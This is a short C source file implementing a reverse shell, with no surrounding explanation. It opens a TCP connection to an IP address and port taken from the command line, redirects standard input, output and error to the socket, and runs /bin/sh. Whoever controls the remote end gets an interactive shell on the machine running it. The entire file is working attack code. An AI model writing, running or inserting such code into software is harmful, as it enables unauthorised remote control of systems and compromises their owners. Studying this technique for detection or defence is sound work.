#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

void reverse_shell(char *ip, int port) {
    struct sockaddr_in revsockaddr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    connect(sock, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        return 1;
    }
    reverse_shell(argv[1], atoi(argv[2]));
    return 0;
}